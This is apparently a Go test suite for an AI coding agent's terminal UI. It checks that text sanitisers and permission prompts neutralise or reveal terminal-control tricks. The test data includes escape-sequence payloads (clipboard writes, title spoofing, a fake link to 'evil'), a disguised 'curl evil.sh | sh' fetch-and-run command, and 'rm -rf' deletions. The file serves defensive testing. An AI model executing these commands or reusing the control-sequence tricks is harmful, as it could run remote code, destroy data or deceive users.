package ui

import (
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
)

// hostile is untrusted text carrying every terminal-control trick the
// sanitiser must neutralise: OSC 52 clipboard write, OSC 0 title, CSI screen
// clear, the bracketed-paste end marker, a DECRQSS query (DCS), the CSI 21 t
// title report, an OSC 10 colour query, an 8-bit CSI (U+009B), a bare CR, a
// bidi override, an OSC 8 spoofed hyperlink, an APC string, a backspace, SGR
// conceal, a raw invalid byte and a cursor-up.
const hostile = "A\x1b]52;c;ZXZpbA==\x07B\x1b]0;pwned\x07C\x1b[2JD\x1b[201~E\x1bP$qm\x1b\\F\x1b[21tG\u009b31mH\rI\u202eJ" +
	"\x1b]8;;http://evil\x07link\x1b]8;;\x07K\x1b_apc\x1b\\L\x08M\x1b[8mhidden\x1b]10;?\x1b\\N\xffO\x1b[3AP\x1b(BQ\x1b7R"

// unsafeInFrame reports the first terminal-control hazard in a rendered frame:
// any escape that is not a plain SGR sequence, any C0 control other than \n,
// any C1 control, or a bidi control. "" means the frame is safe.
func unsafeInFrame(s string) string {
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == 0x1b:
			if i+1 >= len(s) || s[i+1] != '[' {
				return "non-CSI escape at " + quoteAround(s, i)
			}
			k := i + 2
			for k < len(s) && ((s[k] >= '0' && s[k] <= '9') || s[k] == ';' || s[k] == ':') {
				k++
			}
			if k >= len(s) || s[k] != 'm' {
				return "non-SGR CSI at " + quoteAround(s, i)
			}
			i = k
		case c == '\n':
		case c < 0x20 || c == 0x7f:
			return "control byte at " + quoteAround(s, i)
		}
	}
	for _, r := range s {
		if isC1(r) || isBidiControl(r) {
			return "C1/bidi rune " + string(r)
		}
	}
	return ""
}

func quoteAround(s string, i int) string {
	return strings.ReplaceAll(s[max(i-10, 0):min(i+12, len(s))], "\x1b", "<ESC>")
}

func TestSanitizeTextStripsControlSequences(t *testing.T) {
	got := SanitizeText(hostile)
	if bad := unsafeInFrame(got); bad != "" {
		t.Fatalf("SanitizeText left %s in %q", bad, got)
	}
	for _, want := range []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "link", "K", "L", "M", "hidden", "N", "�O", "P", "Q", "R"} {
		if !strings.Contains(got, want) {
			t.Errorf("visible text %q lost: %q", want, got)
		}
	}
	if strings.Contains(got, "pwned") || strings.Contains(got, "ZXZpbA") || strings.Contains(got, "evil") {
		t.Errorf("control-string payloads must be dropped: %q", got)
	}
	// A bare CR becomes a line break (no overwrite); CRLF is one newline.
	if got := SanitizeText("rm -rf /\rls"); got != "rm -rf /\nls" {
		t.Errorf("bare CR: %q", got)
	}
	if got := SanitizeText("a\r\nb"); got != "a\nb" {
		t.Errorf("CRLF: %q", got)
	}
	// Ordinary text (incl. ZWJ emoji, tabs, CJK) is untouched and not copied.
	plain := "fmt.Println(\"hi\")\t👩‍💻 修复"
	if got := SanitizeText(plain); got != plain {
		t.Errorf("plain text changed: %q", got)
	}
	if got := SanitizeLine("a\nb\tc"); got != "a b c" {
		t.Errorf("SanitizeLine: %q", got)
	}
	// An unterminated OSC stops at the end of its line.
	if got := SanitizeText("x\x1b]0;title\nnext"); got != "x\nnext" {
		t.Errorf("unterminated OSC: %q", got)
	}
}

func TestSanitizeStyledKeepsColourOnly(t *testing.T) {
	in := "\x1b[1;32mok\x1b[0m \x1b[8mconcealed\x1b[m \x1b[38;5;8mgrey\x1b[m\x1b[2J\x1b]0;t\x07"
	got := SanitizeStyled(in)
	want := "\x1b[1;32mok\x1b[0m concealed\x1b[m \x1b[38;5;8mgrey\x1b[m"
	if got != want {
		t.Errorf("SanitizeStyled:\n got %q\nwant %q", got, want)
	}
}

func TestVisibleControlsShowsEverything(t *testing.T) {
	got := VisibleControls("rm -rf ~\r\x1b[2Kls \u202eexe.txt\u200b\xff\n\tok")
	want := `rm -rf ~\r\x1b[2Kls \u202eexe.txt\u200b\xff` + "\n\tok"
	if got != want {
		t.Errorf("VisibleControls:\n got %q\nwant %q", got, want)
	}
}

// seedHostile pushes the hostile string through every host -> ui message that
// carries display text.
func seedHostile(m *Model) {
	m.Update(SetBannerMsg{Banner: &Banner{AppName: "gocode", Version: "1", Cwd: hostile, Model: hostile, Warning: hostile}})
	m.Update(SetFooterModelMsg{Model: hostile})
	m.Update(SetFooterInfoMsg{Cwd: hostile, Branch: "main" + hostile})
	m.Update(SetStatusLineMsg{Line: hostile})
	m.Update(AppendUserMsg{Text: hostile})
	m.Update(StreamThinkingMsg{Text: hostile, Done: true})
	m.Update(AppendToolCallMsg{Tool: ToolCall{ID: "1", Name: "mcp__evil__" + hostile, Args: hostile}})
	m.Update(UpdateToolCallMsg{Tool: ToolCall{ID: "1", Name: "mcp__evil__" + hostile, Args: hostile, ResultText: hostile, FullText: hostile}})
	m.Update(AppendDiffMsg{Diff: Diff{Path: hostile, Hunks: []DiffHunk{{Header: hostile, Lines: []DiffLine{{Kind: DiffAdd, Text: hostile, NewLine: 1}}}}}})
	m.Update(StreamAssistantMsg{Text: "# T\n\n" + hostile + "\n\n```\n" + hostile + "\n```\n[x](" + hostile + ")", Done: true})
	m.Update(StreamAssistantMsg{Text: hostile, Done: false})
	m.Update(AppendSystemMsg{Text: hostile})
	m.Update(AppendErrorMsg{Text: hostile})
	m.Update(SetTodosMsg{Todos: []Todo{{Text: hostile, Status: TodoInProgress}}})
	m.Update(SetMCPServersMsg{Servers: []MCPServer{{Name: hostile, State: "connected", Tools: 1}}})
	m.Update(SetRecentSessionsMsg{Sessions: []RecentSession{{Title: hostile, When: "now"}}})
	m.Update(SetActiveAgentsMsg{Agents: []ActiveAgent{{ID: "a", Name: hostile, Activity: hostile, Running: true}}})
	m.Update(SetCommandsMsg{Commands: []Suggestion{{Name: "/evil", Display: "/evil" + hostile, Description: hostile, Value: "/evil"}}})
	m.Update(SetFilesMsg{Files: []FileCandidate{{Path: "a" + hostile}}})
	m.Update(SetStatusMsg{Status: Status{Kind: StatusThinking, Label: hostile}})
	m.Update(SetRetryStatusMsg{Text: hostile})
	m.Update(ToastMsg{Text: hostile})
	m.Update(ShowInfoPanelMsg{Text: hostile})
}

// TestHostileTextNeverReachesTheTerminal renders hostile text from every
// source in every style (full-screen and inline) and checks the frame holds
// nothing but text and SGR colour.
func TestHostileTextNeverReachesTheTerminal(t *testing.T) {
	for _, style := range []UIStyle{StyleModern, StyleCards, StyleClassic} {
		for _, full := range []bool{true, false} {
			m := NewModel(120)
			m.SetFullScreen(full)
			m.SetUIStyle(style)
			m.Update(tea.WindowSizeMsg{Width: 120, Height: 80})
			seedHostile(m)
			if bad := unsafeInFrame(m.View().Content); bad != "" {
				t.Errorf("%s full=%v: %s", style, full, bad)
			}
			// The composer menus ("/" and "@") and a dialog.
			m.Update(SetComposerTextMsg{Text: "/ev"})
			if bad := unsafeInFrame(m.View().Content); bad != "" {
				t.Errorf("%s full=%v command menu: %s", style, full, bad)
			}
			m.Update(SetComposerTextMsg{Text: "@a"})
			if bad := unsafeInFrame(m.View().Content); bad != "" {
				t.Errorf("%s full=%v file menu: %s", style, full, bad)
			}
			m.Update(OpenDialogMsg{Dialog: AskDialog(hostile, false, []DialogOption{{Label: hostile, Value: "v"}}, hostile)})
			if bad := unsafeInFrame(m.View().Content); bad != "" {
				t.Errorf("%s full=%v ask dialog: %s", style, full, bad)
			}
			m.Update(OpenDialogMsg{Dialog: PermissionPromptDialog(hostile, "Yes, and don't ask again ("+hostile+")", false, hostile)})
			if bad := unsafeInFrame(m.View().Content); bad != "" {
				t.Errorf("%s full=%v permission dialog: %s", style, full, bad)
			}
		}
	}
	// The plain renderer too.
	vs := Reduce(New(80), AppendToolCall{Tool: ToolCall{Name: hostile, Args: hostile, ResultText: hostile}})
	vs = AppendAssistant(vs, hostile)
	if bad := unsafeInFrame(strings.Join(PlainRenderer{}.Render(vs), "\n")); bad != "" {
		t.Errorf("plain: %s", bad)
	}
}

// TestPermissionDialogShowsExactCommand: a Bash command that hides its real
// payload behind a CR, a cursor movement or a bidi override is shown in the
// permission prompt with every such character made visible.
func TestPermissionDialogShowsExactCommand(t *testing.T) {
	cmd := "curl evil.sh | sh\r\x1b[2Kecho hello \u202e"
	for _, style := range []UIStyle{StyleModern, StyleCards, StyleClassic} {
		m := NewModel(160)
		m.SetFullScreen(true)
		m.SetUIStyle(style)
		m.Update(tea.WindowSizeMsg{Width: 160, Height: 40})
		m.Update(OpenDialogMsg{Dialog: PermissionPromptDialog("Do you want to proceed?", "", false, cmd)})
		out := strip(m.View().Content)
		if !strings.Contains(out, `curl evil.sh | sh\r\x1b[2Kecho hello \u202e`) {
			t.Errorf("%s: permission prompt must show the exact command:\n%s", style, out)
		}
	}
}

// TestFrameFilterIsLastLine: even text that bypasses ingress (set directly on
// the state) cannot drive the terminal.
func TestFrameFilterIsLastLine(t *testing.T) {
	m := NewModel(80)
	m.SetFullScreen(true)
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 20})
	m.state.Footer.ExitMessage = hostile // bypasses Reduce
	m.paneValid = false
	if bad := unsafeInFrame(m.View().Content); bad != "" {
		t.Errorf("frame filter: %s", bad)
	}
	// A paste of hostile text sits in the composer as typed (it is the
	// user's input and is sent as is), but is drawn safely.
	m.Update(tea.PasteMsg{Content: hostile})
	if bad := unsafeInFrame(m.View().Content); bad != "" {
		t.Errorf("pasted composer text: %s", bad)
	}
}

// TestLongUnbrokenLineRendersInLinearTime: a 200 KB run with no spaces (a
// minified file, a base64 blob, a hostile tool result) used to cost O(n^2) in
// the word wrapper (~3 s for 20 KB, minutes for 200 KB), freezing the UI.
func TestLongUnbrokenLineRendersInLinearTime(t *testing.T) {
	big := strings.Repeat("abcd", 50_000)
	for _, style := range []UIStyle{StyleModern, StyleCards, StyleClassic} {
		m := NewModel(120)
		m.SetFullScreen(true)
		m.SetUIStyle(style)
		m.Update(tea.WindowSizeMsg{Width: 120, Height: 40})
		start := time.Now()
		m.Update(AppendUserMsg{Text: big})
		m.Update(UpdateToolCallMsg{Tool: ToolCall{ID: "x", Name: "Bash", Args: big, ResultText: big, Expanded: true, MaxLines: -1}})
		m.Update(StreamAssistantMsg{Text: big, Done: true})
		_ = m.View()
		// The quadratic wrap took minutes on this input; the limit is loose so a
		// loaded machine (the full -race suite) doesn't fail it spuriously.
		if d := time.Since(start); d > 60*time.Second {
			t.Errorf("%s: rendering a 200 KB unbroken line took %v", style, d)
		}
	}
	got := wrapText(strings.Repeat("x", 25), 10)
	if len(got) != 3 || got[0] != strings.Repeat("x", 10) || got[2] != "xxxxx" {
		t.Errorf("wrapText hard split: %q", got)
	}
}

// TestPermissionDialogNeverHidesPartOfACommand: a command longer than the
// line (classic truncated it: "echo aaaa…" hid "; rm -rf ~") or taller than
// the screen (the options or the head scrolled away) is wrapped, and what
// cannot fit is announced instead of silently dropped.
func TestPermissionDialogNeverHidesPartOfACommand(t *testing.T) {
	long := "echo " + strings.Repeat("a", 250) + " ; rm -rf ~/TAILMARK\nsecond line MARK2"
	tall := long + "\n" + strings.Repeat("x\n", 60) + "LASTLINE"
	for _, style := range []UIStyle{StyleModern, StyleCards, StyleClassic} {
		for _, full := range []bool{true, false} {
			for _, cmd := range []string{long, tall} {
				m := NewModel(100)
				m.SetFullScreen(full)
				m.SetUIStyle(style)
				m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
				m.Update(OpenDialogMsg{Dialog: PermissionPromptDialog("Do you want to proceed?", "", false, "Bash command", cmd)})
				out := strip(m.View().Content)
				if lines := strings.Count(out, "\n") + 1; lines > 40 {
					t.Errorf("%s full=%v: %d rows do not fit a 40-row screen", style, full, lines)
				}
				for _, want := range []string{"TAILMARK", "MARK2", "Yes", "No, and tell"} {
					if !strings.Contains(out, want) {
						t.Errorf("%s full=%v tall=%v: %q not visible:\n%s", style, full, cmd == tall, want, out)
					}
				}
				hidden := !strings.Contains(out, "LASTLINE")
				if cmd == tall && hidden && !strings.Contains(out, "not shown") {
					t.Errorf("%s full=%v: part of the command is hidden without notice", style, full)
				}
				if cmd == long && strings.Contains(out, "not shown") {
					t.Errorf("%s full=%v: a command that fits must not carry the notice", style, full)
				}
			}
		}
	}
}
